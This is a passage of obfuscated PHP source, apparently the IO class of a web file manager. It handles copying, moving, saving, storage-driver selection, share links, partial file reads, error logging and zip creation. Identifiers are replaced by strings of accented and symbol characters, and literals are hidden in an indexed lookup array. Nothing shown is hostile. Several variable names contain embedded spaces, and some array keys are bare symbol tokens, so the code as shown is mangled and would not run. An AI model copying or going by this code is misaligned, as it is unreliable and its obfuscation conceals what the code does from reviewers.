@call_user_func_array(array($ìü¶œ¾å, $¥•æö²Ã), $Ï¡†² Ó); } else { if (method_exists($ìü¶œ¾å, $Õ×¡âú[1224])) { $Î›Ë¹é = @call_user_func_array(array($ìü¶œ¾å, $¥•æö²Ã), $Ï¡†² Ó); } else { if (method_exists(self, $¥•æö²Ã)) { $Î›Ë¹é = @call_user_func_array(array(self, $¥•æö²Ã), $Ï¡†² Ó); } else { $Î›Ë¹é = call_user_func_array(array(parent, $¥•æö²Ã), $Ï¡†² Ó); } } } Hook::trigger($Õ×¡âú[1222] . $¥•æö²Ã . $Õ×¡âú[1225], $Æ¢ùü†ì, $Î›Ë¹é); return $Î›Ë¹é; } public static function init($æ½šˆ) { return self::driverMake($æ½šˆ); } public static function copy($Àæ½»¸, $Í™–ÀÂÈ, $ñ‚Ëù±Ä = false, $‚¯ŠáşŠ = false) { return self::copyMoveStart($Àæ½»¸, $Í™–ÀÂÈ, $ñ‚Ëù±Ä, $_SERVER[÷åé¼î][602], $‚¯ŠáşŠ); } public static function move($ßáâÔ«™, $ËÙÔ”š, $‹ÏÚşìß = false, $ï´Ş„°ø = false) { return self::copyMoveStart($ßáâÔ«™, $ËÙÔ”š, $‹ÏÚşìß, $_SERVER[÷åé¼î][604], $ï´Ş„°ø); } private static function copyMoveStart($îğ¿Åï„, $üÀÍ‚¿ã, $®ØÃÎÜ, $­¾»§ò», $¾ºÓ ›æ) { $æÚ³ÁÍÒ =& $_SERVER[÷åé¼î]; $ß½ÒŠ‹í = array($îğ¿Åï„, $üÀÍ‚¿ã, $®ØÃÎÜ, $¾ºÓ ›æ); Hook::trigger($æÚ³ÁÍÒ[1222] . $­¾»§ò» . $æÚ³ÁÍÒ[1223], $ß½ÒŠ‹í); $ÄÉ²í² = self::copyMove($îğ¿Åï„, $üÀÍ‚¿ã, $®ØÃÎÜ, $­¾»§ò», $¾ºÓ ›æ); Hook::trigger($æÚ³ÁÍÒ[1222] . $­¾»§ò» . $æÚ³ÁÍÒ[1225], $ß½ÒŠ‹í, $ÄÉ²í²); return $ÄÉ²í²; } public static function saveFile($­‚ğÚã‚, $Ÿğìæªá, $ƒ’ÇÏĞŠ = true) { $–Ï†³¾÷ =& $_SERVER[÷åé¼î]; $ËºÑãµ¨ = self::info($Ÿğìæªá); $ï¦¢»İô = self::driverMake($­‚ğÚã‚); $çü¾âù = self::driverMake($Ÿğìæªá); $ŸÏ•¶›È = !1; if ($çü¾âù->pathParse[$–Ï†³¾÷[1226]]) { $ŸÏ•¶›È = $çü¾âù; $âËœ„†õ = $çü¾âù->pathParse[$–Ï†³¾÷[1226]]; $çü¾âù = self::driverMake($âËœ„†õ); } if ($ï¦¢»İô->pathParse[$–Ï†³¾÷[1226]]) { $íı‚äÇ™ = $ï¦¢»İô->pathParse[$–Ï†³¾÷[1226]]; $ï¦¢»İô = self::driverMake($íı‚äÇ™); } $ÑØõß’• = $çü¾âù->pathFather($Ÿğìæªá); $ÏÄÙŞ‘¢ = !0; if (!$ƒ’ÇÏĞŠ && self::driverIsSame($ï¦¢»İô, $çü¾âù)) { $ÏÄÙŞ‘¢ = !1; } $™æº×¼Ü = self::copyFile($ï¦¢»İô, $­‚ğÚã‚, $çü¾âù, $ÑØõß’•, $ËºÑãµ¨[$–Ï†³¾÷[32]], $ÏÄÙŞ‘¢); if ($ŸÏ•¶›È) { $™æº×¼Ü = $ŸÏ•¶›È->getPathOuter($™æº×¼Ü); } return $™æº×¼Ü; } private static function copyMove($ÛİÍĞÅ, $úí—ö©å, $í¯µ­éá, $õõ³¼§¾, $ô¾ÌëÉ® = false) { $§ıò®¥ì =& $_SERVER[÷åé¼î]; if (!$ÛİÍĞÅ || $ÛİÍĞÅ == $§ıò®¥ì[8] || !$úí—ö©å) { return !1; } ignore_timeout(); $¾ğ—¥ñ´ = self::driverMake($ÛİÍĞÅ); $—™ß±¦å = self::driverMake($úí—ö©å); $ŞÖùäÉˆ = $õõ³¼§¾ == $§ıò®¥ì[604]; $ã´å•‹Á = !1; if ($—™ß±¦å->pathParse[$§ıò®¥ì[1226]]) { $ã´å•‹Á = $—™ß±¦å; $úí—ö©å = $—™ß±¦å->pathParse[$§ıò®¥ì[1226]]; $—™ß±¦å = self::driverMake($úí—ö©å); } if ($¾ğ—¥ñ´->pathParse[$§ıò®¥ì[1226]]) { $ÛİÍĞÅ = $¾ğ—¥ñ´->pathParse[$§ıò®¥ì[1226]]; $¾ğ—¥ñ´ = self::driverMake($ÛİÍĞÅ); } self::check($¾ğ—¥ñ´, $ÛİÍĞÅ, $—™ß±¦å, $úí—ö©å); Hook::trigger($§ıò®¥ì[1227], $¾ğ—¥ñ´, $ÛİÍĞÅ, $—™ß±¦å, $úí—ö©å); $‰˜ïÁ¡æ = self::driverIsSame($¾ğ—¥ñ´, $—™ß±¦å); if ($‰˜ïÁ¡æ) { if ($õõ³¼§¾ == $§ıò®¥ì[604] && !method_exists($—™ß±¦å, $§ıò®¥ì[1228]) && trim($úí—ö©å, $§ıò®¥ì[8]) == trim($—™ß±¦å->pathFather($ÛİÍĞÅ), $§ıò®¥ì[8])) { if ($¾ğ—¥ñ´->pathThis($ÛİÍĞÅ) != $ô¾ÌëÉ® && !$¾ğ—¥ñ´->isOsDriver()) { return $¾ğ—¥ñ´->rename($ÛİÍĞÅ, $ô¾ÌëÉ®); } return $—™ß±¦å->getPathOuter($ÛİÍĞÅ); } if (method_exists($—™ß±¦å, $õõ³¼§¾)) { return $—™ß±¦å->{$õõ³¼§¾}($ÛİÍĞÅ, $úí—ö©å, $í¯µ­éá, $ô¾ÌëÉ®); } } if ($‰˜ïÁ¡æ && $õõ³¼§¾ == $§ıò®¥ì[604] && $—™ß±¦å->getType() == $§ıò®¥ì[109]) { $ıı·²æš = $—™ß±¦å->movePath($ÛİÍĞÅ, $úí—ö©å, $ô¾ÌëÉ®); if ($ıı·²æš) { return $ıı·²æš; } } $±‘µ—ƒ­ = $¾ğ—¥ñ´->isFile($ÛİÍĞÅ); if (!$±‘µ—ƒ­ && $—™ß±¦å->getType() == $§ıò®¥ì[822] && $¾ğ—¥ñ´->getType() == $§ıò®¥ì[109]) { $ıı·²æš = $—™ß±¦å->copyFolderFromIO($¾ğ—¥ñ´, $ÛİÍĞÅ, $úí—ö©å, $í¯µ­éá, $ŞÖùäÉˆ, $ô¾ÌëÉ®); } else { $ıı·²æš = self::copyPath($¾ğ—¥ñ´, $ÛİÍĞÅ, $—™ß±¦å, $úí—ö©å, $í¯µ­éá, $ŞÖùäÉˆ, $±‘µ—ƒ­, $ô¾ÌëÉ®); } if ($ıı·²æš && $ŞÖùäÉˆ) { $¾ğ—¥ñ´->remove($ÛİÍĞÅ); } if ($ã´å•‹Á) { $ıı·²æš = $ã´å•‹Á->getPathOuter($ıı·²æš); } return $ıı·²æš; } private static function check($ÜÁ¤¬·, $÷ê²±–ú, $ç˜øû¬œ, &$ç ã¦“) { $ß ‰í½Æ =& $_SERVER[÷åé¼î]; if (self::driverIsSame($ÜÁ¤¬·, $ç˜øû¬œ) && $ÜÁ¤¬·->isFolder($÷ê²±–ú) && $ÜÁ¤¬·->isParentOf($÷ê²±–ú, $ç ã¦“)) { show_json(LNG($ß ‰í½Æ[1229]), !1); } if (!$ÜÁ¤¬·->exist($÷ê²±–ú)) { show_json(LNG($ß ‰í½Æ[108]), !1); } } private static function copyPath($«åô¸›§, $°‰»˜Ë, $™úÉô–¡, $§„ ŸÈ, $Ü˜ß½å´, $ëÈá£±‰, $¿À»áĞ, $Ú¨’•‚ø = false, $¶¡¸ª†£ = true) { $ü‹âÅ¶í =& $_SERVER[÷åé¼î]; $Ô ¸„öÊ = empty($Ú¨’•‚ø) && $Ú¨’•‚ø !== $ü‹âÅ¶í[228] ? $«åô¸›§->pathThis($°‰»˜Ë) : $Ú¨’•‚ø; if ($Ü˜ß½å´) { $‰ÛØª¶§ = $™úÉô–¡->fileNameExist($§„ ŸÈ, $Ô ¸„öÊ); $ˆç×Œ‰¹ = $Ô ¸„öÊ; $Ô ¸„öÊ = $™úÉô–¡->fileNameAuto($§„ ŸÈ, $Ô ¸„öÊ, $Ü˜ß½å´, !$¿À»áĞ); if (!$‰ÛØª¶§ || $ˆç×Œ‰¹ != $Ô ¸„öÊ) { $Ü˜ß½å´ = !1; } if ($¶¡¸ª†£ && !$Ü˜ß½å´) { $™úÉô–¡->_data[$ü‹âÅ¶í[1230]] = !0; } } if ($¿À»áĞ) { return self::copyFile($«åô¸›§, $°‰»˜Ë, $™úÉô–¡, $§„ ŸÈ, $Ô ¸„öÊ, $ëÈá£±‰); } if ($Ü˜ß½å´ == REPEAT_RENAME_FOLDER) { $Ü˜ß½å´ = !1; } $Ó·ğú = rtrim($§„ ŸÈ, $ü‹âÅ¶í[8]) . $ü‹âÅ¶í[8] . $Ô ¸„öÊ; $ÏùòÍ±Î = $™úÉô–¡->mkdir($™úÉô–¡->getPath($Ó·ğú), $Ü˜ß½å´); $§„ ŸÈ = $™úÉô–¡->getPathInner($ÏùòÍ±Î); $“©å¾—† = $«åô¸›§->listPath($°‰»˜Ë, !0); $“©å¾—† = is_array($“©å¾—†) ? $“©å¾—† : array($ü‹âÅ¶í[86] => array(), $ü‹âÅ¶í[85] => array()); $„™šÇ¶Ô = array_merge($“©å¾—†[$ü‹âÅ¶í[86]], $“©å¾—†[$ü‹âÅ¶í[85]]); foreach ($„™šÇ¶Ô as $£î¢Íá¥) { $™ÙÛ¢ŒŸ = $£î¢Íá¥[$ü‹âÅ¶í[33]] == $ü‹âÅ¶í[230]; $°‰»˜Ë = $«åô¸›§->getPathInner($£î¢Íá¥[$ü‹âÅ¶í[87]]); $áƒ¹ş‰ = self::copyPath($«åô¸›§, $°‰»˜Ë, $™úÉô–¡, $§„ ŸÈ, $Ü˜ß½å´, $ëÈá£±‰, $™ÙÛ¢ŒŸ, !1, !1); if (!$áƒ¹ş‰) { IO::errorTips($ü‹âÅ¶í[1231] . $°‰»˜Ë . $ü‹âÅ¶í[73] . $§„ ŸÈ); } } self::copyMoveKeepInfo($«åô¸›§, $°‰»˜Ë, $ÏùòÍ±Î); return $ÏùòÍ±Î; } private static function copyFile($Ô“ğ†¤°, $Ï†Á‰”¾, $±ÅÌ¦¸£, $ùÍÇƒ°ş, $û¥ï½ôå, $äÕœı×Ä) { $˜›á“¦ =& $_SERVER[÷åé¼î]; $ùÍÇƒ°ş = $±ÅÌ¦¸£->getPath(rtrim($ùÍÇƒ°ş, $˜›á“¦[8]) . $˜›á“¦[8] . $û¥ï½ôå); $ÈúÓçÙö = $˜›á“¦[1232] . time() . rand_string(5); Hook::trigger($˜›á“¦[1233], $Ô“ğ†¤°, $Ï†Á‰”¾, $±ÅÌ¦¸£, $ùÍÇƒ°ş, $û¥ï½ôå, $ÈúÓçÙö); if (self::driverIsSame($Ô“ğ†¤°, $±ÅÌ¦¸£)) { if ($äÕœı×Ä) { $”¹Š­ù™ = $±ÅÌ¦¸£->moveFile($Ï†Á‰”¾, $ùÍÇƒ°ş); } else { $”¹Š­ù™ = $±ÅÌ¦¸£->copyFile($Ï†Á‰”¾, $ùÍÇƒ°ş); } Hook::trigger($˜›á“¦[1234], $Ô“ğ†¤°, $Ï†Á‰”¾, $±ÅÌ¦¸£, $ùÍÇƒ°ş, $û¥ï½ôå, $”¹Š­ù™); self::copyMoveKeepInfo($Ô“ğ†¤°, $Ï†Á‰”¾, $”¹Š­ù™); return $”¹Š­ù™; } $¯…¤ìÏ® = TEMP_FILES; if ($GLOBALS[$˜›á“¦[6]][$˜›á“¦[92]][$˜›á“¦[861]]) { $¯…¤ìÏ® = $GLOBALS[$˜›á“¦[6]][$˜›á“¦[92]][$˜›á“¦[861]]; } $ÓòÑïíØ = $¯…¤ìÏ®; mk_dir($ÓòÑïíØ); $¦‘şÁÔ˜ = $ÓòÑïíØ . $ÈúÓçÙö; $ş¥şãûÌ = $¦‘şÁÔ˜; $¦‘şÁÔ˜ = $Ô“ğ†¤°->download($Ï†Á‰”¾, $¦‘şÁÔ˜); $¦‘şÁÔ˜ = $Ô“ğ†¤°->iconvApp($¦‘şÁÔ˜); if (substr($¦‘şÁÔ˜, strlen($¯…¤ìÏ®)) == $¯…¤ìÏ®) { $äÕœı×Ä = !0; } $”¹Š­ù™ = $±ÅÌ¦¸£->upload($ùÍÇƒ°ş, $¦‘şÁÔ˜, $äÕœı×Ä); self::remove($ş¥şãûÌ); Hook::trigger($˜›á“¦[1234], $Ô“ğ†¤°, $Ï†Á‰”¾, $±ÅÌ¦¸£, $ùÍÇƒ°ş, $û¥ï½ôå, $”¹Š­ù™); self::copyMoveKeepInfo($Ô“ğ†¤°, $Ï†Á‰”¾, $”¹Š­ù™); return $”¹Š­ù™; } private static function copyMoveKeepInfo($Ö½“ÔÈË, $Ó†˜¡‘µ, $«­§ÚÒã) { if (!$«­§ÚÒã) { return; } $“Ç¢Áéà = $Ö½“ÔÈË->info($Ó†˜¡‘µ); if (!is_array($“Ç¢Áéà)) { return; } IO::setModifyTime($«­§ÚÒã, $“Ç¢Áéà[$_SERVER[÷åé¼î][88]]); } public static function pathFather($š€¸êñ) { $Òğ©¸É = IO::init($š€¸êñ); $®Œ«Áî = $Òğ©¸É->pathFather($Òğ©¸É->path); return $Òğ©¸É->getPathOuter($®Œ«Áî); } public static function fileOut($¾â•å€™, $Ò‘Ï™äè = false, $ÖîµîÙ = false, $‘îçâ» = '') { $¡…¢·¿ = self::driverMake($¾â•å€™); if ($¡…¢·¿->isFileOutServer()) { return $¡…¢·¿->fileOutServer($¾â•å€™, $Ò‘Ï™äè, $ÖîµîÙ, $‘îçâ»); } return $¡…¢·¿->fileOut($¾â•å€™, $Ò‘Ï™äè, $ÖîµîÙ, $‘îçâ»); } public static function fileOutImage($Ÿ‰¹àÈ, $§öÜ¨Üë = 250) { $·÷†äğ = array(250, 600, 1200, 2000, 3000, 5000); for ($€†ØË·° = 0; $€†ØË·° < count($·÷†äğ); $€†ØË·°++) { if ($€†ØË·° == 0 && $§öÜ¨Üë <= $·÷†äğ[$€†ØË·°]) { $§öÜ¨Üë = $·÷†äğ[$€†ØË·°]; break; } else { if ($§öÜ¨Üë > $·÷†äğ[$€†ØË·° - 1] && $§öÜ¨Üë <= $·÷†äğ[$€†ØË·°]) { $§öÜ¨Üë = $·÷†äğ[$€†ØË·°]; break; } else { if ($€†ØË·° == count($·÷†äğ) - 1 && $§öÜ¨Üë > $·÷†äğ[$€†ØË·°]) { $§öÜ¨Üë = $·÷†äğ[$€†ØË·°]; break; } } } } $ú³ù¦ã = self::driverMake($Ÿ‰¹àÈ); if ($ú³ù¦ã->isFileOutServer()) { return $ú³ù¦ã->fileOutImageServer($Ÿ‰¹àÈ, $§öÜ¨Üë); } return $ú³ù¦ã->fileOutImage($Ÿ‰¹àÈ, $§öÜ¨Üë); } private static function driverIsSame($é¬Ø«ÅÀ, $·šñÔù¿) { $æÚáÉŒº =& $_SERVER[÷åé¼î]; $™ÌÔí·à = $é¬Ø«ÅÀ->getType(); $«âÚ¿› = $·šñÔù¿->getType(); if ($™ÌÔí·à != $«âÚ¿›) { return !1; } if ($™ÌÔí·à == $æÚáÉŒº[822]) { return !0; } if ($™ÌÔí·à == $æÚáÉŒº[109]) { return !0; } if ($é¬Ø«ÅÀ->pathDriver == $·šñÔù¿->pathDriver) { return !0; } return !1; } public static function copyUpdate($´´ÎÚËØ, $„üÇáª·) { $Ú¤»˜À½ =& $_SERVER[÷åé¼î]; if (!IO::exist($´´ÎÚËØ)) { return !1; } if (!IO::exist($„üÇáª·)) { IO::mkdir($„üÇáª·); } $¾ş¨ççü = array_to_keyvalue(self::listAllSimple($´´ÎÚËØ), $Ú¤»˜À½[87]); $¬§ÙÓ· = array_to_keyvalue(self::listAllSimple($„üÇáª·), $Ú¤»˜À½[87]); $î¿œ¨Ô = array(); $´ëá”·­ = array(); foreach ($¾ş¨ççü as $şø¢Ü°† => $ÊöÇô€Ğ) { if (isset($¬§ÙÓ·[$şø¢Ü°†])) { if ($ÊöÇô€Ğ[$Ú¤»˜À½[78]] == 1) { continue; } if ($¬§ÙÓ·[$şø¢Ü°†][$Ú¤»˜À½[79]] == $ÊöÇô€Ğ[$Ú¤»˜À½[79]]) { continue; } } if ($ÊöÇô€Ğ[$Ú¤»˜À½[78]] == 1) { $´ëá”·­[] = $„üÇáª· . $Ú¤»˜À½[8] . trim($şø¢Ü°†, $Ú¤»˜À½[8]); continue; } $ÜÅ¡Œâ¶ = strstr(trim($şø¢Ü°†, $Ú¤»˜À½[8]), $Ú¤»˜À½[8]) ? get_path_father($şø¢Ü°†) : $Ú¤»˜À½[12]; $î¿œ¨Ô[] = array($Ú¤»˜À½[1235] => $ÊöÇô€Ğ[$Ú¤»˜À½[89]], $Ú¤»˜À½[1236] => rtrim($„üÇáª·, $Ú¤»˜À½[8]) . $Ú¤»˜À½[8] . $ÜÅ¡Œâ¶, $Ú¤»˜À½[1237] => $ÊöÇô€Ğ); } $óÑø¹Ê = array($Ú¤»˜À½[230] => $î¿œ¨Ô, $Ú¤»˜À½[78] => $´ëá”·­); Hook::trigger($Ú¤»˜À½[1238], $´´ÎÚËØ, $„üÇáª·, $óÑø¹Ê); foreach ($´ëá”·­ as $ÊöÇô€Ğ) { IO::mkdir($ÊöÇô€Ğ); } foreach ($î¿œ¨Ô as $ÊöÇô€Ğ) { IO::copy($ÊöÇô€Ğ[$Ú¤»˜À½[1235]], $ÊöÇô€Ğ[$Ú¤»˜À½[1236]], REPEAT_REPLACE); } } public static function fileSubstr($ˆêææÓ¹, $Ì’ßé², $ĞÙÍ›Ò¥ = false) { $¸ã€Ñß¡ =& $_SERVER[÷åé¼î]; $ÈÓÆ¤  = self::driverMake($ˆêææÓ¹); $¹×ÃÌÅ = $ÈÓÆ¤ ->size($ˆêææÓ¹); $ÖùÌ ï² = $Ì’ßé²; $ øÀ¸ı = $ĞÙÍ›Ò¥; if ($Ì’ßé² < 0) { $Ì’ßé² = $¹×ÃÌÅ + $Ì’ßé²; } if ($ĞÙÍ›Ò¥ === !1) { $ĞÙÍ›Ò¥ = $¹×ÃÌÅ - $Ì’ßé²; } if ($Ì’ßé² + $ĞÙÍ›Ò¥ > $¹×ÃÌÅ) { $ĞÙÍ›Ò¥ = $¹×ÃÌÅ - $Ì’ßé²; } if (!$¹×ÃÌÅ && $ÈÓÆ¤ ->getType() == $¸ã€Ñß¡[109] && !$ÈÓÆ¤ ->exist($ˆêææÓ¹)) { $òÄó“ó = get_path_this($ˆêææÓ¹); $§Ñîòûô = parse_url_query($òÄó“ó); if (is_array($§Ñîòûô) && isset($§Ñîòûô[$¸ã€Ñß¡[32]])) { $òÄó“ó = urldecode($§Ñîòûô[$¸ã€Ñß¡[32]]); } throw new Exception($¸ã€Ñß¡[1239] . LNG($¸ã€Ñß¡[1240]) . $¸ã€Ñß¡[1038] . clear_html($òÄó“ó) . $¸ã€Ñß¡[12]); } if ($ĞÙÍ›Ò¥ <= 0) { return $¸ã€Ñß¡[12]; } if ($Ì’ßé² < 0 || $Ì’ßé² >= $¹×ÃÌÅ || $ĞÙÍ›Ò¥ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\122\x65\x61\144\x20\x65\162\162\x6f\x72\x21\40\x73\x74\x61\162\164\x3d{$Ì’ßé²}\73\x6c\145\x6e\147\x74\150\75{$ĞÙÍ›Ò¥}\x3b\x20\163\x69\172\x65\x3d{$¹×ÃÌÅ}\73"); } $ÓèÊû½ = $ÈÓÆ¤ ->fileSubstr($ˆêææÓ¹, $Ì’ßé², $ĞÙÍ›Ò¥); if (!$ÓèÊû½ && $ĞÙÍ›Ò¥ && isset($GLOBALS[$¸ã€Ñß¡[1241]])) { throw new Exception($GLOBALS[$¸ã€Ñß¡[1241]][$¸ã€Ñß¡[1242]]); } return $ÓèÊû½; } private static function driverMake(&$é‰ñÜìË) { $í‹½ÏÕ¸ =& $_SERVER[÷åé¼î]; $Å¦§’®¼ = KodIO::parse($é‰ñÜìË); if (!self::$driverListSystem) { $êŞÖèó¨ = Model($í‹½ÏÕ¸[832])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($êŞÖèó¨, $í‹½ÏÕ¸[459]); } if ($Å¦§’®¼[$í‹½ÏÕ¸[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Å¦§’®¼[$í‹½ÏÕ¸[459]]]) { throw new Exception($í‹½ÏÕ¸[1243]); return !1; } $é‰ñÜìË = $Å¦§’®¼[$í‹½ÏÕ¸[1244]]; $ÚŞæ‡Æ = self::driverGet($Å¦§’®¼, $é‰ñÜìË); return $ÚŞæ‡Æ; } private static function driverGet($ô±ÒÒŞÁ, &$ğÂÃò ö) { $õÔíâÆ¦ =& $_SERVER[÷åé¼î]; $øáüë±— = $ô±ÒÒŞÁ[$õÔíâÆ¦[1245]]; $şªİÑÜä = $ô±ÒÒŞÁ[$õÔíâÆ¦[459]]; switch ($ô±ÒÒŞÁ[$õÔíâÆ¦[33]]) { case KodIO::KOD_IO: $©ğÉÇ³ = self::$driverListSystem[$şªİÑÜä]; break; case KodIO::KOD_SOURCE: $ğÂÃò ö = $şªİÑÜä . $ğÂÃò ö; $©ğÉÇ³ = array($õÔíâÆ¦[1246] => $õÔíâÆ¦[1247], $õÔíâÆ¦[6] => $ô±ÒÒŞÁ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ûÂÚ¶Îß = $GLOBALS[$õÔíâÆ¦[1248]]; self::$driverListUser = array_to_keyvalue($ûÂÚ¶Îß, $õÔíâÆ¦[459]); } $©ğÉÇ³ = self::$driverListUser[$şªİÑÜä]; break; case KodIO::KOD_SHARE_LINK: $©ğÉÇ³ = array($õÔíâÆ¦[1246] => $õÔíâÆ¦[1249], $õÔíâÆ¦[6] => $ô±ÒÒŞÁ); $¬—à°æ½ = Action($õÔíâÆ¦[1250])->sharePathInfo($ô±ÒÒŞÁ[$õÔíâÆ¦[87]]); $ğÂÃò ö = $¬—à°æ½[$õÔíâÆ¦[193]]; if (!$¬—à°æ½[$õÔíâÆ¦[193]]) { $™å„‘…™ = Model($õÔíâÆ¦[648])->getInfo($¬—à°æ½[$õÔíâÆ¦[649]]); $ğÂÃò ö = KodIO::clear($™å„‘…™[$õÔíâÆ¦[1251]] . $ô±ÒÒŞÁ[$õÔíâÆ¦[1244]]); $ô±ÒÒŞÁ[$õÔíâÆ¦[544]] = $™å„‘…™; $ô±ÒÒŞÁ[$õÔíâÆ¦[1226]] = $ğÂÃò ö; $©ğÉÇ³ = array($õÔíâÆ¦[1246] => $õÔíâÆ¦[1252], $õÔíâÆ¦[6] => $ô±ÒÒŞÁ); } break; case KodIO::KOD_SHARE_ITEM: $©ğÉÇ³ = array($õÔíâÆ¦[1246] => $õÔíâÆ¦[1253], $õÔíâÆ¦[6] => $ô±ÒÒŞÁ); $™å„‘…™ = Model($õÔíâÆ¦[648])->getInfo($ô±ÒÒŞÁ[$õÔíâÆ¦[459]]); if ($™å„‘…™[$õÔíâÆ¦[193]] == $õÔíâÆ¦[228]) { $ğÂÃò ö = KodIO::clear($™å„‘…™[$õÔíâÆ¦[1251]] . $ô±ÒÒŞÁ[$õÔíâÆ¦[1244]]); $ô±ÒÒŞÁ[$õÔíâÆ¦[544]] = $™å„‘…™; $ô±ÒÒŞÁ[$õÔíâÆ¦[1226]] = $ğÂÃò ö; $©ğÉÇ³ = array($õÔíâÆ¦[1246] => $õÔíâÆ¦[1254], $õÔíâÆ¦[6] => $ô±ÒÒŞÁ); } else { if (!$ğÂÃò ö) { $ğÂÃò ö = $™å„‘…™[$õÔíâÆ¦[193]]; } } break; default: $ğÂÃò ö = $ô±ÒÒŞÁ[$õÔíâÆ¦[87]]; $©ğÉÇ³ = array($õÔíâÆ¦[1246] => $õÔíâÆ¦[1255]); break; } $ñ¯‰†Å = $ô±ÒÒŞÁ[$õÔíâÆ¦[87]]; if (!isset(self::$driverCache[$ñ¯‰†Å])) { $´•ñ¨  = strtolower($©ğÉÇ³[$õÔíâÆ¦[98]]); $—¹§Šæ = $GLOBALS[$õÔíâÆ¦[6]][$õÔíâÆ¦[92]][$õÔíâÆ¦[890]]; $şŠ€Êíæ = $õÔíâÆ¦[77] . (isset($—¹§Šæ[$´•ñ¨ ]) ? $—¹§Šæ[$´•ñ¨ ] : ucfirst($´•ñ¨ )); if (!class_exists($şŠ€Êíæ)) { show_json("{$şŠ€Êíæ}\x20\x6e\x6f\x74\x20\145\170\x69\x73\164\163\41", !1); } $ºÖı¹¥ê = isset($©ğÉÇ³[$õÔíâÆ¦[6]]) ? $©ğÉÇ³[$õÔíâÆ¦[6]] : !1; self::$driverCache[$ñ¯‰†Å] = new $şŠ€Êíæ($ºÖı¹¥ê); } $â©Ûê§ = self::$driverCache[$ñ¯‰†Å]; $â©Ûê§->pathDriver = $øáüë±—; $â©Ûê§->pathBase = $õÔíâÆ¦[12]; if (isset($©ğÉÇ³[$õÔíâÆ¦[6]][$õÔíâÆ¦[1256]])) { $â©Ûê§->pathBase = rtrim($©ğÉÇ³[$õÔíâÆ¦[6]][$õÔíâÆ¦[1256]], $õÔíâÆ¦[8]) . $õÔíâÆ¦[8]; $ğÂÃò ö = $â©Ûê§->pathBase . ltrim($ğÂÃò ö, $õÔíâÆ¦[8]); } $ğÂÃò ö = $â©Ûê§->getPath($ğÂÃò ö); if (isset($ô±ÒÒŞÁ[$õÔíâÆ¦[1226]])) { $ğÂÃò ö = $ô±ÒÒŞÁ[$õÔíâÆ¦[1226]]; } $â©Ûê§->path = $ğÂÃò ö; return $â©Ûê§; } public static function errorTips($ü«Ğ·Ÿß = false) { $£å”õ¯ =& $_SERVER[÷åé¼î]; static $‘Ù»¸¼¤ = array(); $À·µÚÁ = 1000; if ($ü«Ğ·Ÿß === -1) { return $‘Ù»¸¼¤ ? $‘Ù»¸¼¤[count($‘Ù»¸¼¤) - 1] : $£å”õ¯[12]; } if ($ü«Ğ·Ÿß === !1) { return implode($£å”õ¯[262], $‘Ù»¸¼¤); } if (count($‘Ù»¸¼¤) >= $À·µÚÁ) { $‘Ù»¸¼¤ = array_slice($‘Ù»¸¼¤, $À·µÚÁ * 0.5, $À·µÚÁ); } $‘Ù»¸¼¤[] = $ü«Ğ·Ÿß; write_log($£å”õ¯[176] . ACTION . $£å”õ¯[1257] . $ü«Ğ·Ÿß, $£å”õ¯[1258]); } public static function getLastError($ôïÖáŞØ = '') { $€¥ˆå»± = self::errorTips(-1); return $€¥ˆå»± ? $€¥ˆå»± : $ôïÖáŞØ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Æ³Á¢‹·; if ($Æ³Á¢‹·) { return $Æ³Á¢‹·; } $¡«Êıò³ = IO::init($_SERVER[÷åé¼î][8]); return $¡«Êıò³; } private static function iconvSystem($äı¬Ãäğ) { return self::local()->iconvSystem($äı¬Ãäğ); } private static function iconvApp($”¹¯€¦) { return self::local()->iconvApp($”¹¯€¦); } public static function zipFolder($ÊÉà“Ÿš, $ãØ®ÑÕ = "\x7a\x69\x70", $¾á¯Ô×“ = '', $ÂÍì±í = REPEAT_RENAME) { $ñ•Ù»Š‹ =& $_SERVER[÷åé¼î]; $ÀòıúÀ = IO::listPath($ÊÉà“Ÿš); if (!$ÀòıúÀ) { return !1; } $ÀòıúÀ = array_merge($ÀòıúÀ[$ñ•Ù»Š‹[85]], $ÀòıúÀ[$ñ•Ù»Š‹[86]]); return self::zip($ÀòıúÀ, $ãØ®ÑÕ, $¾á¯Ô×“, $ÂÍì±í); } public static function zip($€ğ”½¹ö, $„·¼İì = "\x7a\151\160", $Ûøµ‹á = '', $ª¢§¨í£ = REPEAT_RENAME) { $‡ÔåŠÙ¡ =& $_SERVER[÷åé¼î]; if (is_string($€ğ”½¹ö) && $€ğ”½¹ö) { $€ğ”½¹ö = array(array($‡ÔåŠÙ¡[87] => $€ğ”½¹ö)); } $Ñçğ‘« = self::init($€ğ”½¹ö[0][$‡ÔåŠÙ¡[87]]); $‹ëõ–ä½ = self::info($€ğ”½¹ö[0][$‡ÔåŠÙ¡[87]]); $‹Ú‰ú¦ = $‡ÔåŠÙ¡[12]; $ì„èˆÜÁ = $‡ÔåŠÙ¡[12]; $öÔıÛ˜ = $‡ÔåŠÙ¡[12]; if ($Ûøµ‹á && substr($Ûøµ‹á, -1, 1) != $‡ÔåŠÙ¡[8]) { $ì„èˆÜÁ = get_path_father($Ûøµ‹á); $öÔıÛ˜ = get_path_this($Ûøµ‹á); } else { $ì„èˆÜÁ = self::pathFather($‹ëõ–ä½[$‡ÔåŠÙ¡[87]]); $öÔıÛ˜ = $‹ëõ–ä½[$‡ÔåŠÙ¡[32]] . $‡ÔåŠÙ¡[10] . $„·¼İì; if (count($€ğ”½¹ö) > 1) { $äõ†§ç× = IO::info($ì„èˆÜÁ); $öÔıÛ˜ = $äõ†§ç×[$‡ÔåŠÙ¡[32]] . $‡ÔåŠÙ¡[10] . $„·¼İì; } if ($Ûøµ‹á) { $ì„èˆÜÁ = $Ûøµ‹á; } } if ($Ñçğ‘«->getType() == $‡ÔåŠÙ¡[109]) { $ÆÚØ»³ = self::init($ì„èˆÜÁ); $×ñ£“‰Ÿ = $ÆÚØ»³->getType() == $‡ÔåŠÙ¡[109] ? $ì„èˆÜÁ : get_path_father($Ñçğ‘«->path); $×ñ£“‰Ÿ = rtrim($×ñ£“‰Ÿ, $‡ÔåŠÙ¡[8]) . $‡ÔåŠÙ¡[8]; mk_dir($×ñ£“‰Ÿ); } else { $‹Ú‰ú¦ = TEMP_FILES . $‡ÔåŠÙ¡[1259] . time() . rand_string(8) . $‡ÔåŠÙ¡[8]; mk_dir($‹Ú‰ú¦); file_put_contents($‹Ú‰ú¦ . 